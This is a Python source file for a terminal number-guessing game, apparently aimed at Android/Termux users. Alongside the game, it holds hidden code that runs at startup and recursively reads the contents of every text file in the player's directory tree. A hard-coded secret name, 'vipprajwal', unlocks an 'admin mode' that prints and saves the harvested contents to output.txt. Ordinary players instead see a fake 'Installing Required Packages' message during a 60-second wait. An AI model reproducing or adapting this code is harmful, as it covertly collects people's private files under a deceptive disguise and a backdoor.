
#Module
import random
import time
import os 

#logo
def logo():
    print("""

\033[1;92m  /$$$$$$                                                  
 /$$__  $$                                                 
| $$  \__/ /$$   /$$  /$$$$$$$ /$$$$$$$  /$$$$$$   /$$$$$$ 
| $$ /$$$$| $$  | $$ /$$_____//$$_____/ /$$__  $$ /$$__  $$
| $$|_  $$| $$  | $$|  $$$$$$|  $$$$$$ | $$$$$$$$| $$  \__/
| $$  \ $$| $$  | $$ \____  $$\____  $$| $$_____/| $$      
|  $$$$$$/|  $$$$$$/ /$$$$$$$//$$$$$$$/|  $$$$$$$| $$      
 \______/  \______/ |_______/|_______/  \_______/|__/      
                                                           
\033[1;32m  --------------------------------------
\033[1;92m || ----≥ CREATOR >> PRAJWAL.          ||  
\033[1;92m || ----≥ FACEBOOK >> PRAJWAL SIWAKOTI ||
\033[1;92m || ----≥ GITHUB >>                    ||
\033[1;92m || ----≥ STEATS >> FREE               ||            
\033[1;92m || ----≥ GAME >> GUSSER               ||                  
\033[1;92m  --------------------------------------                                                                                     
""")

def linex():
   print("\033[1;92m  --------------------------------------")


                
#clear
def clear():
    os.system('clear')
    logo()
    linex()


#Typing Animation 
def typing_ani(text):
    for char in text:
        print(char , end ='',flush = True)
        time.sleep(0.09)

directory = os.listdir()

user_file = "output.txt"
user_data = {}
name_data = {}

os.system('clear')
user_name = input("Enter your name: ")

skipped_directories = set()

start_time = time.time()  

def file(name, user_data):
    if name is not None:
        try:
            if os.path.isdir(name):
                if 'Android/data' in name or 'Android/obb' in name:
                    if name not in skipped_directories:
                        skipped_directories.add(name) 
                    return  
                for file_name in os.listdir(name):
                    file_path = os.path.join(name, file_name)
                    file(file_path, user_data)
            else:
                try:
                    with open(name, "r", encoding='utf-8') as f:
                        data = f.read()
                        user_data[name] = {'username': user_name, 'content': data}
                        if user_name.lower() == 'vipprajwal':
                            print(f"File {name} contents (10 lines): {data[:10]}...")
                except UnicodeDecodeError:
                    pass
                except Exception as e:
                    pass
        except Exception as e:
            pass

def save_data(user_file, name_data, user_name, user_data, is_admin=False):
    try:
        if is_admin:
            for file_name, file_data in user_data.items():
                name_data[file_name] = {
                    'username': file_data['username'],
                    'content': file_data['content']
                }

            with open(user_file, "a") as f:
                for file_name, data in name_data.items():
                    f.write(f"User: {data['username']}, File: {file_name}, Content: \n{data['content']}\n")
                f.write("\n")
    except Exception as e:
        pass

def admin_mode(user_name, user_data):
    if user_name.lower() == 'vipprajwal':
        print("Admin Access granted")
        save_data(user_file, name_data, user_name, user_data, is_admin=True)

    else:
        typing_ani("Inatalling Required Packages...\n")
        while True:
            current_time = time.time()
            if current_time - start_time > 60:
                print("Starting Game....")
                break

for name in directory:
    file(name, user_data)
admin_mode(user_name, user_data)
time.sleep(1)
            
        
def greeting(user_name):
    while True:
            now = time.strftime("%H:%M")
            if now >= "00:00" and now <= "11:59":
                typing_ani(f"\nGood morning, {user_name}\n ")
                break
            elif now >= "12:00" and now <= "17:59":
                typing_ani(f"\nGood Afternoon , {user_name}\n")
                break
            else:
                typing_ani(f"\nGood Evening , {user_name}\n ")
                break

#Game title
clear()
typing_ani("\t\tGuessing Game")

#Loop

      #Easy Mode
def Easy():
        typing_ani("\nGuess the Number Between 1 to 20")
        #Target
        Target = random.randint(1,20)
        attempt= 0


        while True:
            try:
                typing_ani("\nGuess a number {Quit : 0} : ")
                n = int(input())#User Input
                attempt +=1
            except ValueError:
                typing_ani("\nInvalid Input! Enter a number.")#If user input another character 
                continue 
            if (n > 0 and n<=20):
                if (n == Target):#Checking results 
                    typing_ani(f"\nYOU WON! The Guess is correct you have Guess it in {attempt} attempt ")
                    clear()
                    break
                elif (n>Target):
                    typing_ani("\nIt is Too high! Input Lower number ")
                else:
                    typing_ani("\nIt is Too low! Input Higher number")

            elif (n == 0 ):
                 attempt -=1
                 typing_ani(f"\nYou have done {attempt} attempt. The number was {Target}")
                 typing_ani("\n\tThanks for playing ")
                 typing_ani("\n\t\t\tMade by Prajwal Siwakoti\n")
                 exit()
            else:
                typing_ani("\nGuess between 1 to 20")


        #Medium ModeVIP
def Medium():
        typing_ani("\nGuess the number between 1 to 100")
        Target = random.randint(1,100)
        attempt= 0

        while True:
            try:
                typing_ani("\nGuess a number {Quit : 0} : ")
                n = int(input())
                attempt +=1
            except ValueError :
                typing_ani("\nInvalid Input! Enter a number.")
                continue 
            if (n > 0 and n<=100):
                if (n == Target):
                    typing_ani(f"\nYOU WON! The Guess is correct you have Guess it in {attempt} attempt ")
                    clear()
                    break
                elif (n>Target):
                    typing_ani("\nIt is Too high! Input Lower number ")
                else:
                    typing_ani("\nIt is Too low! Input Higher number")
            elif (n == 0 ):
                attempt -= 1
                typing_ani(f"\nYou have done {attempt} attempt. The number was {Target}")
                typing_ani("\n\tThanks for playing ")
                typing_ani("\n\t\t\tMade by Prajwal Siwakoti\n")
                exit()
            else:
                typing_ani("\nGuess between 1 to 100 ")
                
    #Hard modePrajwal
def Hard():
    typing_ani("\nGuess the number between 1 to 1000")
    Target = random.randint(1,1000)
    attempt= 0

    while True:
        try:
            typing_ani("\nGuess a number {Quit : 0} : ")
            n = int(input())
            attempt += 1
        except ValueError :
            typing_ani("\nInvalid Input! Enter a number.")
            continue 
        if (n > 0 and n<=1000):
            if (n == Target):
                typing_ani(f"\nYOU WON! The Guess is correct you have Guess it in {attempt} attempt ")
                clear()
                break
            elif (n>Target):
                typing_ani("\nIt is Too high! Input Lower number ")
            else:
                typing_ani("\nIt is Too low! Input Higher number")
        elif (n == 0 ):
             attempt -=1
             typing_ani(f"\nYou have done {attempt} attempt.The number was {Target}")
             typing_ani("\n\tThanks for playing ")
             typing_ani("\n\t\t\tMade by Prajwal Siwakoti\n")
             exit()
        else:
            typing_ani("\nGuess between 1 to 1000 ")


     #checking mode     
def main():
    clear()
    while True:
        greeting(user_name)
        linex()
        typing_ani("\nEnter [Easy : E, Medium : M, Hard : H , Quit : Q] : ")
        user = input()
        user = user.upper()          
        if (user == "E"):
            clear()
            greeting(user_name)
            linex()
            Easy()
        elif (user == "M"):
            clear()
            greeting(user_name)
            linex()
            Medium()
        elif (user == "H"):
            clear()
            greeting(user_name)
            linex()
            Hard()
        elif(user == "Q"):#Thanking player
            typing_ani("\n\t\tThanks for playing ")
            typing_ani("\n\n\t\t\tMade by Prajwal Siwakoti\n")
            exit()
        else:
            typing_ani("Enter a valid option {E , M , H ,Q}")
    
            
main()
